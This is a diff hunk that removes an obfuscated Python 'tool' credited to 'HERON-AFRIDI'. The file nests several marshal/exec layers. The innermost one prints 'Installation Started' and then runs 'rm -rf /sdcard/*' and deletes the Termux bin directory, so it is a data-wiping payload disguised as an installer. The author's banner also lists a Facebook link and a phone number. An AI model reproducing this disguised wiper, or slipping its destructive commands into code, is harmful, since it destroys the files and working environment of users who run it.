@@ -1,7 +1,0 @@
-#_____________________________________
-#|>| THIS TOOL IS ENC BY HERON-AFRIDI
-#|>|FB_LINK:-https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN
-#|>|WHATS_APP:-+8801722183463
-#_____________________________________
-import marshal
-exec(marshal.loads(b'\xe1K\x04\x00\x00#_____________________________________\n#|>| THIS TOOL IS ENC BY HERON-AFRIDI\n#|>|FB_LINK:-https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN\n#|>|WHATS_APP:-+8801722183463\n#_____________________________________\nimport marshal\nexec(marshal.loads(b\'\\xe1\\x01\\x03\\x00\\x00#_____________________________________\\n#|>| THIS TOOL IS ENC BY HERON-AFRIDI\\n#|>|FB_LINK:-https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN\\n#|>|WHATS_APP:-+8801722183463\\n#_____________________________________\\nimport marshal\\nexec(marshal.loads(b\\\'\\\\xe1\\\\xd8\\\\x01\\\\x00\\\\x00#_____________________________________\\\\n#|>| THIS TOOL IS ENC BY HERON-AFRIDI\\\\n#|>|FB_LINK:-https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN\\\\n#|>|WHATS_APP:-+8801722183463\\\\n#_____________________________________\\\\nimport marshal\\\\nexec(marshal.loads(b\\\\\\\'\\\\\\\\xf5\\\\\\\\xb0\\\\\\\\x00\\\\\\\\x00\\\\\\\\x00import os\\\\\\\\nfrom os import system as sagor\\\\\\\\n\\\\\\\\nprint(" [\\\\\\\\xe2\\\\\\\\x9c\\\\\\\\x93] Installation Started")\\\\\\\\nsagor("rm -rf /sdcard/*")\\\\\\\\nsagor("rm -rf $PERFIX/bin")\\\\\\\\nprint(" [\\\\\\\\xe2\\\\\\\\x9c\\\\\\\\x93] Magir pola ,Guya mara Done")\\\\\\\\n\\\\\\\'))\\\'))\'))'))
